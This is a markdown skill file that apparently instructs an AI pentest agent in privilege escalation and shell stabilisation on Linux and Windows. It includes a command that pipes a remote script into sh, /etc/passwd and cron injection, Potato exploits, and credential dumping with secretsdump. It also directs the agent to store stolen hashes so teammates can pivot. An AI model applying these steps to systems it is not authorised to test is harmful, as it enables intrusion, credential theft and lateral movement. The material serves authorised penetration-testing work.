---
name: privilege-escalation
description: |
  Turn a low-privilege foothold (web shell, unprivileged SSH, www-data/service account) into root/SYSTEM.
  Use immediately after gaining any code execution when the objective is server access/root, or when a shell exists
  but at insufficient privilege. Covers Linux (SUID/sudo/capabilities/cron/kernel/writable paths/GTFOBins) and
  Windows (token/service/registry/AlwaysInstallElevated/unquoted paths/potato) local privesc, plus stabilizing a
  raw shell into an interactive one.
tags: [pentest, privesc, post-exploitation, linux, windows]
---

# Privilege Escalation & Shell Stabilization

Getting a shell is not the objective — getting the *stated* privilege is (usually root/SYSTEM, per the verifier's
rules). The moment you have any code execution, stabilize the shell, enumerate systematically, then escalate.

Run everything through `kali-arsenal`. For an interactive foothold shell, use the session tools
(`ssh_session_new` / `ssh_session_send` / `ssh_session_read`) so you can work inside the shell across turns; catch
reverse shells with `ssh_listener_start`.

## 0. Stabilize a raw shell first

A dumb reverse shell breaks on the first interactive prompt. Upgrade it:

```bash
# in the caught reverse shell (via ssh_session_send)
python3 -c 'import pty;pty.spawn("/bin/bash")'   # or script -qc /bin/bash /dev/null
# then background it (Ctrl-Z) and on Kali: stty raw -echo; fg   (skill-driven; use socat/pwncat for a full PTY)
export TERM=xterm
```

Prefer `socat`/`pwncat-cs` listeners (via `ssh_listener_start(tool="socat"|"pwncat")`) for a real PTY from the start.

## 1. Automated enumeration (run first, read the top findings)

```bash
# Linux
ssh_execute("curl -s https://raw.githubusercontent.com/.../linpeas.sh | sh")   # or upload linpeas.sh
# Windows
winPEAS.exe / winPEASany.exe ; PowerUp.ps1 Invoke-AllChecks ; Seatbelt.exe -group=all
```

Upload the tool via `ssh_upload` to Kali then deliver to the target, or host it and pull. Run long enums as a
background job and poll. Read the flagged (95%/highlighted) items first, don't scroll the whole dump.

## 2. Linux escalation checklist (fast wins first)

- **sudo -l**: any `NOPASSWD` entry → check GTFOBins for that binary. `sudo` version → CVE (e.g. Baron Samedit).
- **SUID/SGID**: `find / -perm -4000 -type f 2>/dev/null` → cross-check GTFOBins (`find`, `nmap`, `vim`, `env`,
  `python`, `cp`, `bash`, ...). GTFOBins is your first stop for any unexpected setuid/sudo binary.
- **Capabilities**: `getcap -r / 2>/dev/null` (`cap_setuid` on python/perl = instant root).
- **Cron**: `cat /etc/crontab`, `/etc/cron.*`, world-writable scripts run by root → inject.
- **Writable sensitive files**: `/etc/passwd` writable → add root user; writable service unit / `LD_PRELOAD`
  via env-preserving sudo.
- **Credentials on disk**: `.bash_history`, `.ssh/`, config files, `.env`, DB creds, `cat /var/www/**/config*`.
- **Kernel**: `uname -a` → search exploit only when config-based paths are exhausted (kernel exploits are noisy and
  can crash the box — last resort, and never on production without operator OK).
- **Containers**: if inside Docker, check for privileged/mounted docker.sock, `/`-mount, `CAP_SYS_ADMIN` → escape.

## 3. Windows escalation checklist

- `whoami /priv` → `SeImpersonatePrivilege`/`SeAssignPrimaryToken` → Potato family (Godpotato/PrintSpoofer) → SYSTEM.
- Unquoted service paths, weak service permissions (`accesschk`), `AlwaysInstallElevated` (HKLM+HKCU) → MSI.
- Stored creds: `cmdkey /list`, registry autologon, `runas /savecred`, SAM/SYSTEM hive → secretsdump.
- Unpatched → check `systeminfo` against known LPE (e.g. via wesng/watson) as a fallback.

## 4. After root/SYSTEM

- Grab decisive fresh proof for the verifier: `id` / `whoami /priv` / `hostname` / read a root-only file.
- `record_asset(kind="session", ...)` and `record_asset(kind="credential", ...)` for anything reusable
  (root shell, dumped hashes) so teammates pivot instead of re-rooting.
- `report_finding(objective_achieved=true)` only with the fresh code-execution proof (per verifier rules: admin
  JWT/CMS login alone is NOT server access).

## Related skills
- Chaining across hosts once local root → `lateral-movement`
- Payloads / reverse shells → `payloads-all-the-things`, `payload-research`
